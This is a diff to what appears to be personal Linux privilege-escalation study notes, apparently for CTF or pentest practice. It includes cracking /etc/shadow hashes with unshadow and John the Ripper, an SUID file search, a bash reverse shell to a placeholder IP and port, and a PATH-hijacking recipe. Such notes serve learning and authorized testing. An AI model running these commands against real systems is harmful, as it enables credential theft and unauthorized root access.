@@ -39,7 +39,12 @@ Commands with permmisions of the file owner <br>
 `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. <br>
 Again you can compare compare executables on [GTFOBins+suid](https://gtfobins.github.io/#+suid).
 
-It can be usefull to crack passwords using /etc/shadow and /etc/passwd files `unshadow passwd.txt shadow.txt > passwords.txt` and then johnTheRipper `john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passwords.txt` <br>
+It can be usefull to crack passwords using /etc/shadow and /etc/passwd files and then johnTheRipper  <br>
+<pre>unshadow passwd.txt shadow.txt > passwords.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passwords.txt
+</pre>
+
 
 ## Capabilities
 
@@ -56,4 +61,22 @@ easy rev shell<br>
 <pre>#!/bin/bash 
 
 bash -i >& /dev/tcp/IP/PORT 0>&1</pre>
+
+## PATH
+
+1. What folders are located under $PATH
+2. Does your current user have write privileges for any of these folders?
+3. Can you modify $PATH?
+4. Is there a script/application you can start that will be affected by this vulnerability?
+
+search for writable files <br>
+`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` 
+
+exporting path<br>
+`export PATH=/newPath:$PATH`
+
+easy shell<br>
+<pre>echo "/bin/bash" > file
+
+chmod 777 file </pre>
 
